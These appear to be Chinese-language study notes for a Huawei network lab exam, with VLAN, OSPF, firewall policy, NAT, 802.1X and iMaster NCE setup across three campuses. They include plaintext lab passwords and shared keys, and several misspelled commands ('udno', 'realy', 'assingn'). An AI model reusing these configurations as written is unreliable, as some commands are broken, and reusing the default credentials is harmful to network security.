vlan 51 to 55 101 to 105interface GigabitEthernet 0/0/4  port link-type trunk  port trunk allow-pass vlan 204 205  undo port trunk allow-pass vlan 1interface GigabitEthernet 0/0/5  port link-type trunk  port trunk allow-pass vlan 206 207  undo port trunk allow-pass vlan 1interface GigabitEthernet 0/0/6  port link-type access  port default vlan 60interface Eth-Trunk 2  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 100 209  dis lldp nei brief  trunkport GigabitEthernet 0/0/9 to 0/0/10<span class="hljs-comment">#</span>ip vpn-instance Employee  route-distinguisher 65001:1    quit  quitip vpn-instance Guest  route-distinguisher 65001:2    quit  quit<span class="hljs-comment"># </span>display current-configuration configuration ip-pool...ip pool wired_finance1  vpn-instance Employee  ...<span class="hljs-comment">#</span>interface lo1  ip binding vpn-instance Employee  ip add 10.1.0.4 32interface lo2  ip binding vpn-instance Guest  ip add 10.1.0.5 32interface vlanif 202  ip add 10.1.200.6 30interface vlanif 204  ip add 10.1.200.13 30interface vlanif 205  ip add 10.1.200.17 30interface vlanif 206  ip binding vpn-instance Employee  ip add 10.1.200.21 30interface vlanif 207  ip binding vpn-instance Guest  ip add 10.1.200.25 30interface vlanif 208  ip binding vpn-instance Employee  ip add 10.1.200.29 30  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 209  ip binding vpn-instance Employee  ip add 10.1.200.33 30  dhcp <span class="hljs-keyword">select</span> global<span class="hljs-comment">#</span>interface vlanif 51  ip binding vpn-instance Employee  ip add 10.1.51.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 52  ip binding vpn-instance Employee  ip add 10.1.52.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 53  ip binding vpn-instance Employee  ip add 10.1.53.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 54  ip binding vpn-instance Employee  ip add 10.1.54.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 55  ip binding vpn-instance Employee  ip add 10.1.55.254 24  dhcp <span class="hljs-keyword">select</span> global<span class="hljs-comment">#</span>interface vlanif 60  ip binding vpn-instance Employee  ip add 10.1.60.254 24<span class="hljs-comment">#</span>interface vlanif 101  ip binding vpn-instance Guest  ip add 10.1.101.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 102  ip binding vpn-instance Guest  ip add 10.1.102.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 103  ip binding vpn-instance Guest  ip add 10.1.103.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 104  ip binding vpn-instance Guest  ip add 10.1.104.254 24  dhcp <span class="hljs-keyword">select</span> globalinterface vlanif 105  ip binding vpn-instance Guest  ip add 10.1.105.254 24  dhcp <span class="hljs-keyword">select</span> globalX_T1<span class="hljs-comment"># X_T1_AGG1 </span>dhcp <span class="hljs-built_in">enable</span>vlan batch 11 to 15 21 to 25dis port vlaninterface Eth-trunk 2  port hybrid tagged vlan 11 to 15 21 to 25 100interface Eth-trunk 3  port hybrid tagged vlan 11 to 15 21 to 25 100<span class="hljs-comment">#</span>dis ip int briefinterface lo0  ip add 10.1.0.6 32interface vlanif 11  ip add 10.1.11.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 12  ip add 10.1.12.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 13  ip add 10.1.13.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 14  ip add 10.1.14.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 15  ip add 10.1.15.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 21  ip add 10.1.21.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 22  ip add 10.1.22.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 23  ip add 10.1.23.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 24  ip add 10.1.24.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29interface vlanif 25  ip add 10.1.25.254 24  dhcp <span class="hljs-keyword">select</span> relay  dhcp relay server-ip 10.1.200.29dis ip int  brief<span class="hljs-comment"># X_T1_ACC1</span>vlan batch 11 to 15 21 to 25 100interface Eth-trunk 1  port trunk allow-pass vlan 11 to 15 21 to 25 100dis port vlan<span class="hljs-comment"># X_T1_ACC2</span>vlan batch 11 to 15 21 to 25 100interface Eth-trunk 1  port trunk allow-pass vlan 11 to 15 21 to 25 100 interface GigabitEthernet 0/0/1 port hybrid pvid vlan 24 port hybrid untagged vlan 24dis port vlanX_T2<span class="hljs-comment"># X_T2_AGG1</span>dhcp <span class="hljs-built_in">enable</span>vlan batch 31 to 35 41 to 45 100 209interface Eth-Trunk 1  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 100 209  dis lldp nei brief  trunkport GigabitEthernet 0/0/5 to 0/0/6interface Eth-Trunk 2  mode lacp-static  port hybrid tagged vlan 31 to 35 41 to 45 100  trunkport GigabitEthernet 0/0/1 to 0/0/2interface Eth_Trunk 3  mode lacp-static  port hybrid tagged vlan 31 to 35 41 to 45 100  trunkport GigabitEthernet 0/0/3 to 0/0/4dis port vlan<span class="hljs-comment">#</span>dis ip int brierinterface vlanif 209  ip add 10.1.200.34 30interface vlanif 31  ip add 10.1.31.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 32  ip add 10.1.32.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 33  ip add 10.1.33.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 34  ip add 10.1.34.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 35  ip add 10.1.35.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 41  ip add 10.1.41.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 42  ip add 10.1.42.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 43  ip add 10.1.43.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 44  ip add 10.1.44.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33interface vlanif 45  ip add 10.1.45.254 24  dhcp <span class="hljs-keyword">select</span> realy  dhcp realy server-ip 10.1.200.33<span class="hljs-comment"># X_T2_ACC1</span>vlan batch 31 to 35 41 to 45 100interface Eth-Trunk 1  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 31 to 35 41 to 45 100  dis lldp nei brief  trunkport GigabitEthernet 0/0/23 to 0/0/24interface GigabitEthernet 0/0/1 port hybrid pvid vlan 33 port hybrid untagged vlan 33<span class="hljs-comment"># X_T2_ACC2</span>vlan batch 31 to 35 41 to 45 100interface Eth-Trunk 1  mode lacp-static  port link-type trunk  port trunk allow-pass vlan 31 to 35 41 to 45 100  dis lldp nei brief  trunkport GigabitEthernet 0/0/23 to 0/0/24interface GigabitEthernet 0/0/22  port link-type access  port default vlan 100X_T1_FW<span class="hljs-comment"># X_T1_FW</span>vlan batch 204 to 207interface GigabitEthernet 1/0/1  portswitch  port link-type trunk  port trunk allow-pass vlan 204 205  undo port trunk allow-pass vlan 1interface GigabitEthernet 1/0/2  portswitch  port link-type trunk  port trunk allow-pass vlan 206 207  undo port trunk allow-pass valn 1interface lo1interface lo2vsys <span class="hljs-built_in">enable</span>vsys name Employee  assign vlan 204  assign vlan 206  assign interface LoopBack 1vsys name Guest  assign vlan 205  assign vlan 207  assingn interface LoopBack 2interface lo1  ip add 10.1.0.8 32interface lo2  ip add 10.1.0.9 32interface vlanif 204  ip add 10.1.200.14 30interface vlanif 205  ip add 10.1.200.18 30interface vlanif 206  ip add 10.1.200.22 30interface vlanif 207  ip add 10.1.200.26 30interface Virtual-<span class="hljs-keyword">if</span> 1  ip add 10.1.200.254 32interface Virtual-<span class="hljs-keyword">if</span> 2  ip add 10.1.200.253 32switch vsys Guest  sys    firewall zone trust      add interface vlanif 207    firewall zone untrust      add interface vlanif 205      add interface virtual-if 2    security-policy      rule name ospf        source-zone trust        source-zone untrust        source-zone <span class="hljs-built_in">local</span>        destination-zone <span class="hljs-built_in">local</span>        destination-zone untrust        destination-zone trust        service ospf        action permitswitch vsys Employee  sys    firewall zone trust      add interface vlanif 206     firewall zone untrust      add interface vlanif 204       add interface virtual-if 1    security-policy      rule name ospf        source-zone trust        source-zone untrust        source-zone <span class="hljs-built_in">local</span>        destination-zone <span class="hljs-built_in">local</span>        destination-zone untrust        destination-zone trust        service ospf        action permit 3.1 配置 静态路由 / ip-prefix / vpn-instance / vsys3.2 配置 OSPFX_T_Export<span class="hljs-comment"># X_T_Export1</span>ip route-static 0.0.0.0 0 GigabitEthernet 0/0/0 10.255.1.254ip route-static 0.0.0.0 0 GigabitEthernet 0/0/2 10.255.2.254ospf 1 router-id 10.1.0.1  default-route-advertise  area 0    network 10.1.0.1 0.0.0.0    network 10.1.200.1 0.0.0.0<span class="hljs-comment"># X_T_Export2</span>ip route-static 0.0.0.0 0 GigabitEthernet 0/0/0 10.255.3.254ip route-static 0.0.0.0 0 GigabitEthernet 0/0/2 10.255.4.254ospf 1 router-id 10.1.0.2  default-route-advertise  area 0    network 10.1.0.2 0.0.0.0    network 10.1.200.5 0.0.0.0<span class="hljs-comment"># X_T1_AC</span>ospf 1 router-id 10.1.0.11  area 0     network 10.1.0.11 0.0.0.0    network 10.1.100.254 0.0.0.0    network 10.1.200.10 0.0.0.0<span class="hljs-comment"># X_T1_CORE</span>ip ip-prefix Guest deny 10.1.101.0 24ip ip-prefix Guest deny 10.1.102.0 24ip ip-prefix Guest deny 10.1.103.0 24ip ip-prefix Guest deny 10.1.104.0 24ip ip-prefix Guest deny 10.1.105.0 24ip ip-prefix Guest permit 0.0.0.0 0 less-equal 32ip ip-prefix Employee deny 10.1.11.0 24ip ip-prefix Employee deny 10.1.12.0 24ip ip-prefix Employee deny 10.1.13.0 24ip ip-prefix Employee deny 10.1.14.0 24ip ip-prefix Employee deny 10.1.15.0 24ip ip-prefix Employee deny 10.1.21.0 24ip ip-prefix Employee deny 10.1.22.0 24ip ip-prefix Employee deny 10.1.23.0 24ip ip-prefix Employee deny 10.1.24.0 24ip ip-prefix Employee deny 10.1.25.0 24ip ip-prefix Employee deny 10.1.31.0 24ip ip-prefix Employee deny 10.1.32.0 24ip ip-prefix Employee deny 10.1.33.0 24ip ip-prefix Employee deny 10.1.34.0 24ip ip-prefix Employee deny 10.1.35.0 24ip ip-prefix Employee deny 10.1.41.0 24ip ip-prefix Employee deny 10.1.42.0 24ip ip-prefix Employee deny 10.1.43.0 24ip ip-prefix Employee deny 10.1.44.0 24ip ip-prefix Employee deny 10.1.45.0 24ip ip-prefix Employee deny 10.1.51.0 24ip ip-prefix Employee deny 10.1.52.0 24ip ip-prefix Employee deny 10.1.53.0 24ip ip-prefix Employee deny 10.1.54.0 24ip ip-prefix Employee deny 10.1.55.0 24ip ip-prefix Employee deny 10.1.60.0 24ip ip-prefix Employee permit 0.0.0.0 0 less-equal 32dis ip int briefospf 1 router-id 10.1.0.3  area 0    network 10.1.0.3 0.0.0.0    network 10.1.200.2 0.0.0.0    network 10.1.200.6 0.0.0.0    network 10.1.200.9 0.0.0.0  area 1    network 10.1.200.13 0.0.0.0    filter ip-prefix Guest import  area 2    stub    network 10.1.200.17 0.0.0.0    filter ip-prefix Employee importospf 65001 vpn-instance Employee router-id 10.1.0.4  vpn-instance-capability simple  area 1    network 10.1.0.0 0.0.255.255  silent-interface vlanif 51  silent-interface vlanif 52  silent-interface vlanif 53  silent-interface vlanif 54  silent-interface vlanif 55  silent-interface vlanif 60ospf 65002 vpn-instance Guest router-id 10.1.0.5  vpn-instance-capability simple  area 2    stub    network 10.1.0.0 0.0.255.255  silent-interface vlanif 101  silent-interface vlanif 102  silent-interface vlanif 103  silent-interface vlanif 104  silent-interface vlanif 105<span class="hljs-comment"># X_T1_AGG1</span>ospf 1 router-id 10.1.0.6  silent-interface all  udno silent-interface vlanif 208  area 1    network 10.1.0.0 0.0.255.255<span class="hljs-comment"># X_T2_AGG1</span>ospf 1 router-id 10.1.0.7  silent-interface all  udno silent-interface vlanif 209  area 1    network 10.1.0.0 0.0.255.255<span class="hljs-comment"># X_T1_FW</span>ospf 65001 vpn-instance Employee router-id 10.1.0.8  vpn-instance-capability simple  area 1    network 10.1.0.8 0.0.0.0    network 10.1.200.14 0.0.0.0    network 10.1.200.22 0.0.0.0ospf 65002 vpn-instance Guest router-id 10.1.0.9  vpn-instance-capability simple  area 2    stub    network 10.1.0.9 0.0.0.0    network 10.1.200.18 0.0.0.0    network 10.1.200.26 0.0.0.04.1 配置 无线 / 802.1X 认证 / AP 强制不认证4.2 配置 802.1X / MAC 接入模版，并绑定到身份认证模版中4.3 在汇聚设备的相应端口上开启认证模版<span class="hljs-comment"># X_T1_AC</span>vlan 51 to 55 101 to 105int g 0/0/1  port trunk allow-pass vlan 51 to 55 101 to 105  quitvlan pool wireless_Employee  vlan 51 to 55  assignment <span class="hljs-built_in">hash</span>vlan pool wireless_Guest  vlan 101 to 105  assignment <span class="hljs-built_in">hash</span>wlan  ssid-profile name Guest    ssid X_Guest010    y  ssid-profile name Employee    ssid X_Employee010    y  vap-profile name Employee    service-vlan vlan-pool wireless_Employee    y  vap-profile name Guest    service-vlan vlan-pool wireless_Guest    y  ap-id 1 ap-mac 00e0-fca9-6ac0    ap-name X_T2_AP    ap-group X    y<span class="hljs-comment"># X_T_ACC1/ACC2 </span>l2protocol-tunnel user-defined-protocol 802.1X protocol-mac 0180-c200-0003 group-mac  0100-0000-0002port-group group-number GigabitEthernet 0/0/1 to GigabitEthernet 0/0/22  l2protocol-tunnel user-defined-protocol 802.1X <span class="hljs-built_in">enable</span>interface Eth-trunk 1  l2protocol-tunnel user-defined-protocol 802.1X <span class="hljs-built_in">enable</span><span class="hljs-comment"># X_T_AGG1</span>radius-server template Employee  radius-server authentication 10.1.60.2 1812  radius-server accounting 10.1.60.2 1813  radius-server shared-key cipher Huawei@123radius authorization 10.1.60.2 shared-key cipher Huawei@123aaa  authentication-scheme Employee    authentication-mode radius  authentication-scheme ap_noauthen    authentication-mode none  accounting-scheme Employee    accounting-mode radius  domain Employee    authentication-scheme Employee    accounting-scheme Employee    radius-server Employee  domain ap_noauthen    authenticaton-scheme ap_noauthendomain Employee<span class="hljs-comment"># X_T1_AGG1</span><span class="hljs-comment"># 模拟器不用敲</span>domain ap_noauthen mac-authentication force mac-address 00e0-fcb7-2890 mask ffff-ffff-ffff<span class="hljs-comment"># X_T2_AGG1</span>domain ap_noauthen mac-authentication force mac-address 00e0-fca9-6ac0 mask ffff-ffff-ffff<span class="hljs-comment"># X_T1/2_AGG1 </span>dot1x-access-profile name Employeemac-access-profile name Employeeauthentication-profile name Employee  dot1x-access-profile Employee  mac-access-profile Employeeinterface Eth-trunk 2  authentication-profile Employeeinterface Eth-trunk 3  authentication-profile Employee<span class="hljs-comment"># X_T1_AGG1 </span>vlan pool market  vlan 11 to 15vlan pool procure  vlan 21 to 25<span class="hljs-comment"># X_T2_AGG1</span>vlan pool finance  vlan 31 to 35vlan pool hr  vlan 41 to 455. 配置 FW 策略<span class="hljs-comment"># X_T1_FW</span>ip route-static vpn-instance Guest 10.1.60.99 32 vpn-instance Employeeswitch vsys Guest  sys    ip service-set Guest_Service <span class="hljs-built_in">type</span> object      service protocol tcp source-port 0 to 65535 destination-port 3389    security-policy      rule name Guest_Service //外部无线用户访问HTTP 服务3389        source-zone trust        destination-zone untrust        source-address range 10.1.101.0 10.1.105.255        destination-address 10.1.60.99 mask 255.255.255.255        service Guest_Service        action permit      rule name Deny_other_Servcie        source-zone trust        destination-zone untrust        source-address range 10.1.101.0 10.1.105.255        destination-address 10.1.60.0 mask 255.255.255.0        action deny      rule name Guest_to_Internet //访问Internet 的策略最后配置        source-zone trust        destination-zone untrust        source-address range 10.1.101.0 10.1.105.255        destination-address any        action permitswitch vsys Employee  sys    ip service-set Guest_Service <span class="hljs-built_in">type</span> object      service protocol tcp source-port 0 to 65535 destination-port 3389     ip address-set X <span class="hljs-built_in">type</span> object      add range 10.1.11.0 10.1.15.255      add range 10.1.21.0 10.1.25.255      add range 10.1.31.0 10.1.35.255      add range 10.1.41.0 10.1.45.255      add range 10.1.51.0 10.1.55.255    ip address-set Y <span class="hljs-built_in">type</span> object      add range 10.2.31.0 10.2.35.255      add range 10.2.41.0 10.2.45.255      add range 10.2.51.0 10.2.55.255    ip address-set Z&amp;Store <span class="hljs-built_in">type</span> object      add range 10.2.101.0 10.3.101.255      add range 10.100.2.0 10.100.2.255    quit    security-policy      rule name Wireless_to_Service //内部无线访问服务器        source-zone trust        destination-zone trust        source-address range 10.1.51.0 10.1.55.255        destination-address 10.1.60.100 0.0.0.0        action permit      rule name Deny_other_Service        source-zone trust        destination-zone trust        source-address range 10.1.51.0 10.1.55.255        destination-address 10.1.60.0 0.0.0.255        action deny      rule name Guest_Service //放行Guest 到服务器区域的流量        source-zone untrust        destination-zone trust        source-address range 10.1.101.0 10.1.105.255        destination-address 10.1.60.99 0.0.0.0        service Guest_Service        action permit      rule name Service_http_10.1.60.101 //放行NAT_Service 流量        source-zone untrust        destination-zone trust        source-address any        destination-address 10.1.60.101 0.0.0.0        service http        action permit      rule name X_to_Y&amp;Z&amp;Store        source-zone trust        destination-zone untrust        source-address address-set X        destination-address address-set Y        destination-address address-set Z&amp;Store        action permit      rule name Y&amp;Z&amp;Store_to_X        source-zone untrust        destination-zone trust        source-address address-set Y        source-address address-set Z&amp;Store        destination-address address-set X        action permit      rule name Employee_to_Internet //访问Internet 的策略最后配置        source-zone trust        destination-zone untrust        source-address range 10.1.11.0 10.1.15.255        source-address range 10.1.21.0 10.1.25.255        source-address range 10.1.51.0 10.1.55.255        action permit6. ACL / NAT / Traffic<span class="hljs-comment">## X_T1_CORE</span><span class="hljs-comment"># 模拟器不用敲</span>acl 3000   rule permit ip <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 destination 10.1.60.0 0.0.0.255<span class="hljs-comment"># 连接AC 的物理口,记住即可，无法配置 拟器不用敲。将Employee无线访问服务器60的流量下一跳直接扔给vlan 206</span>interface g0/0/3   traffic-redirect inbound acl 3000 vpn-instance Employee ip-nexthop 10.1.200.22<span class="hljs-comment"># 将源10.1.60.101的tcp 80 流量，直接扔给10.1.200.5</span>acl number 3001  rule permit tcp <span class="hljs-built_in">source</span> 10.1.60.101 0.0.0.0 source-port eq 80 destination anyinterface vlan 204  traffic-redirect inbound acl 3001 ip-nexthop 10.1.200.5<span class="hljs-comment">## X_T_Export1</span>acl 2000  udno rule 5  rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.101.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.102.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.103.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.104.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.105.0 0.0.0.255<span class="hljs-comment">## X_T_Export2</span>acl 2000   rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.101.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.102.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.103.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.104.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.105.0 0.0.0.255nat address-group 1 10.255.4.2 10.255.4.100 interface GigabitEthernet 0/0/0  nat outbound 2000interface GigabitEthernet 0/0/2  nat outbound 2000 address-group 1  nat server protocol tcp global current-interface 8081 inside 10.1.60.101 wwwwacl number 3001  rule permit tcp <span class="hljs-built_in">source</span> 10.1.60.101 0.0.0.0 source-port eq 80 destination anytraffic classifier web  if-match acl 3001traffic behavior web  redirect ip-nexthop 10.255.4.254traffic policy web  classifier web behavior webinterface GigabitEthernet 0/0/1  traffic-policy web inbound7. 测试<span class="hljs-comment"># X_T1_ACC2</span>interface GigabitEthernet 0/0/1  port hybrid untagged vlan 24  port hybrid pvid vlan 24<span class="hljs-comment"># X_T2_ACC1</span>interface GigabitEthernet 0/0/1  port hybrid untagged vlan 33  port hybrid pvid vlan 33<span class="hljs-comment"># 使用 STA 设备连接到T1 X_Guest010 WIFI</span>ping 10.255.1.254ping 10.1.60.99 [不通]<span class="hljs-comment"># 使用 STA 设备连接到T2 X_Employee010 WIFI</span>ping 10.255.1.254ping 10.1.60.100<span class="hljs-comment"># Terminal01测试</span>ping 10.255.1.254ping 10.1.60.100ping 10.1.60.99<span class="hljs-comment"># Terminal02测试</span>ping 10.1.60.100ping 10.255.1.254 [不通]<span class="hljs-comment"># X_T1_AC</span>interface GigabitEthernet 0/0/2  port hybrid untagged vlan 103  port hybrid pvid vlan 103<span class="hljs-comment"># 60.99 模拟终端</span>sys  telnet server <span class="hljs-built_in">enable</span>  telnet server port 3389<span class="hljs-comment"># 模拟Guest</span>telnet 10.1.60.99 3389Y园区：iMaster NCE-Campus SD-WAN 部署概述OSPF / BGP 65003 / VXLANNCE 纳管设备0 - 环境信息<span class="hljs-comment"># 考试环境</span>NCE-Web地址: 172.22.8.71/171NCE-南向地址: 172.22.8.72/172<span class="hljs-comment"># FZ-Rack</span>NCE-Web地址: 172.22.8.71NCE-南向地址: 172.22.8.72快照地址(FC界面): 192.168.10.110<span class="hljs-comment"># NJ-Rack</span>NCE-Web地址: 172.22.8.70NCE-南向地址: 172.22.8.71快照地址(FC界面): 10.1.10.21<span class="hljs-comment"># FZMN-Rack</span>NCE-Web地址: 172.22.8.172<span class="hljs-comment"># NJMN-Rack</span>NCE-Web地址: 172.22.8.81NCE-南向地址: 172.22.8.82快照地址(FC界面): 192.168.130.22user001/Huawei@123admin/Huawei@123<span class="hljs-comment"># 设备清空</span><span class="hljs-comment"># 路由器设备清空&gt; reset saved-configuration</span><span class="hljs-comment"># 路由器设备清空&gt; reboot fast</span><span class="hljs-comment"># 交换机设备清空# reset netconf db-configureation </span>纳管路由器<span class="hljs-comment"># 清除残留netconf</span>&gt; factory-configuration reset<span class="hljs-comment"># Ping通南向地址</span>ping 172.22.8.72<span class="hljs-comment"># Y_Export1</span>int G0/0/8undo portswitchip address 10.255.5.1 24<span class="hljs-comment">#</span>int g0/0/9undo portswitchip address 10.255.6.1 24<span class="hljs-comment">#</span>ip route-static 0.0.0.0 0 10.255.5.254ip route-static 0.0.0.0 0 10.255.6.254<span class="hljs-comment"># Store_Export1</span>int G0/0/8undo portswitchip address 10.255.7.1 24<span class="hljs-comment">#</span>int g0/0/9undo portswitchip address 10.255.8.1 24<span class="hljs-comment">#</span>ip route-static 0.0.0.0 0 10.255.7.254ip route-static 0.0.0.0 0 10.255.8.254<span class="hljs-comment"># Y_Export1/Store1_Export1 设备设置控制器地址（预配没有）</span>agile controller host 172.22.8.72 port 10020<span class="hljs-comment"># esn</span>dis esn<span class="hljs-comment"># 查看注册设备的上线上线</span>dis agile-controller status纳管交换机<span class="hljs-comment"># reset netconf db-configuration</span>1 - 切换 EVPN 网络隧道模式设计 / 基础网络设计 / 网络设置 / 隧道模式 / EVPN切换EVPN切换EVPN2 - 关闭 物理网络 开局邮件加密多分支互联 / 全局配置 / 物理网络 / 设备激活安全配置 / 加密使能多分支互联多分支互联关闭加密使能关闭加密使能3 - 确定 BGP AS 65003 &amp; IP地址池 10.99.0.0/16多分支互联 / 全局配置 / 虚拟网络 / 路由 &amp; IP地址池4 - 创建 Site_Y &amp; Site_Store1多分支互联 / 站点设置 / 创建 / Site_Y 和 Store 站点Site_Y/Site_Store1: 勾选 AR / LSW / WAC参数说明: WAC – 随绑/带AC的交换机; AP – 云AP5 - 添加设备多分支互联 / 设备管理 / 添加设备 / 批量导入 / 选择对应的设备exce模版 / 开始导入 / 确定6 - 创建 WAN链路模版多分支互联 / WAN链路模版7 - 零配置开局 路由器托管配置(手动配置和自动配置)多分支互联 / 零配置开局 / 点击开局 / 站点 / DHCP Option / 模版导入 / 配置地址 / 接口编号 IP GW Mb/s多分支互联 / WAN Underlay / WALN路由（静态路由）配置静态路由和NAT8 - 站点间组网 RR反射器9 - 交换机托管配置 并部署 Management VN91’ Y_Core -&gt; web -&gt; 配置 -&gt; 无线业务管理 -&gt; vlan 3996 -&gt; 应用10 - 纳管检查Fabric(池)资源网络1 - Fabric网络规划配置IGP 协议的地址和VLAN 创建Radius服务 Rrotal认证服务器 802.1X认证模版3 - 创建Fabric网络4 - 配置网络中的设备角色（边缘节点和边界网关节点）5 - 添加DHCP服务器6 - 创建 OA/R&amp;D 业务网络的L3独占外部接口7 - 创建 Guest 业务三层出口8 - 配置Y_AGG和Y_ACC的接入认证9 - 执行点配置10 - 创建LAN侧VN（地址池）11 - 创建OA虚拟网络，分配地址和网关，添加有线认证部分12 - 创建RD虚拟网络，分配网段11-15和21-2513 - 创建Guest虚拟网络14 - 部署VN之间的互通15 - 部署无线用户认证（组/用户）及授权（密码）16 - 创建优秀用户认证（组/用户）及授权（密码）17 - 创建安全组，资源组（IP/掩码）18 - 根据要求部署策略矩阵19 - 部署准入认证20 - 配置授权结果21 - 绑定站点22 - 创建有线用户的授权规则23 - 创建无线用户的授权规则24 - 部署无线网络25 - 创建无线认证模版26 - 交换机的WEB界面中国呢，新建两个SSID模版27 - 创建 Guest/Employee VAP模版，并调用SSID模版，选择安全模版28 - 配置AP组，添加VAP模版1、规划资源池2、配置VXLAN组网方式3、配置DHCP服4、配置外部网络接口5、配置外部网络接口6、配置VN部署7、配置VN之间互通8、配置认证策略9、配置授权规则/授权结果10、配置无线SD-WAN1、创建WAN侧VN（Y_OA_TO_Sites / Guest_To_Internet / OA HUB-Spoke组网）2、LAN/WAN融合3、WAN组网4、Internet访问5、监控6、订单业务流量做低延迟处理7、优化路由Z园区：广域网承载及设计0、概述<span class="hljs-comment"># FC00: 环回口地址</span><span class="hljs-comment"># FC01: 链路互联地址</span><span class="hljs-comment"># FC02: 标签地址</span>1、全局ISIS配置(IGB打通)<span class="hljs-comment"># X/Y/Z_PE1/2</span><span class="hljs-comment">#  network-entity 49.0001.00X0.0000.000X.00</span>bfd quitisis 1 is-level level-2 cost-style wide bfd all-interfaces <span class="hljs-built_in">enable</span> bfd all-interfaces min-tx-interval 500 min-rx-interval 500 network-entity 49.0001.0010.0000.0001.00 domain-authentication-mode md5 plain Huawei@123 frr  loop-free-alternate level-2 <span class="hljs-comment"># 循环-免费-备用</span>  quit quitint lo0 isis <span class="hljs-built_in">enable</span> 1interface GigabitEthernet0/0/0 isis <span 